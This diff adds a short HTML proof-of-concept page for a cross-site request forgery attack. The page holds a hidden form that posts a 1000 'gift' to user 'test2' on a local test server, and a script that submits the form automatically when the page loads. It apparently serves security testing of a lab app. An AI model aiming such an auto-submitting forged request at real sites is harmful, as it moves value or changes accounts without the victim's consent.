@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF POC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form id="csrf-form" action="http://127.0.0.1:8000/gift/0" method="POST">
+        <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="username" value="test2">
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
